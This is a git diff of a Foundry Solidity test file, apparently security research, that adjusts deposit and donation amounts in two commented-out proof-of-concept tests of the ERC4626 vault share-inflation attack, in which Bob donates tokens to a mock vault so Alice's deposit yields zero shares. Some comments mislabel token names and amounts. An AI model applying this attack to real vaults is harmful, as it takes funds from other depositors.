@@ -61,11 +61,11 @@ contract ERC4626Attack is Test {
     //     // 2. Alice tries depositing 100 USDC and should get issued 100 shares of Vault tokens
     //     // 3. Before Alice could deposit, Bob donates 1000_000 USDC to the Vault to reduce the share price resulting in Alice getting 0 shares
     //     vm.startPrank(bob);
-    //     vault.deposit(100_000_000, bob); // Deposit of $100 USDC by Bob
-    //     mockDai.transfer(address(vault), 10_000_000_000_000_000); // Bob would need to transfer 10B USDC to the Vault to reduce the share price
+    //     vault.deposit(1_000_000, bob); // Deposit of $1 USDC by Bob
+    //     mockDai.transfer(address(vault), 100_000_000_000_000); // Bob would need to transfer 100m USDC to the Vault to reduce the share price
     //     vm.stopPrank();
     //     vm.prank(alice);
-    //     vault.deposit(100_000_000, alice); // Max amount that Alice can deposit that will end up her losing all her shares (100 USDC)
+    //     vault.deposit(10_000_000, alice); // Max amount that Alice can deposit that will end up her losing all her shares (10 USDC)
     //     uint256 noOfSharesReceived = vault.balanceOf(bob); 
     //     vm.prank(bob);
     //     vault.redeem(noOfSharesReceived, bob, bob); // Bob redeems all his shares
@@ -79,11 +79,11 @@ contract ERC4626Attack is Test {
     //     // 2. Alice tries depositing 100 USDC and should get issued 100 shares of Vault tokens
     //     // 3. Before Alice could deposit, Bob donates 1000_000_000 USDC to the Vault to reduce the share price resulting in Alice getting 0 shares
     //     vm.startPrank(bob);
-    //     vault.deposit(100_000_000, bob); // Deposit of $100 USDC by Bob
-    //     mockDai.transfer(address(vault), 10_000_000_000_000_000); // Bob would need to transfer 10B USDC to the Vault to reduce the share price
+    //     vault.deposit(1_000_000, bob); // Deposit of $1 USDC by Bob
+    //     mockDai.transfer(address(vault), 100_000_000_000_000); // Bob would need to transfer 100m USDC to the Vault to reduce the share price
     //     vm.stopPrank();
     //     vm.prank(alice);
-    //     console.log("testMaxUSDCDepositForAlice: ", vault.previewDeposit(100_000_000)); // If Alice deposits max this much amount is when her shares will be 0
-    //     assertEq(vault.previewDeposit(100_000_000), 0);
+    //     console.log("testMaxUSDCDepositForAlice: ", vault.previewDeposit(10_000_000)); // If Alice deposits max this much amount is when her shares will be 0
+    //     assertEq(vault.previewDeposit(10_000_000), 0);
     // }
 }
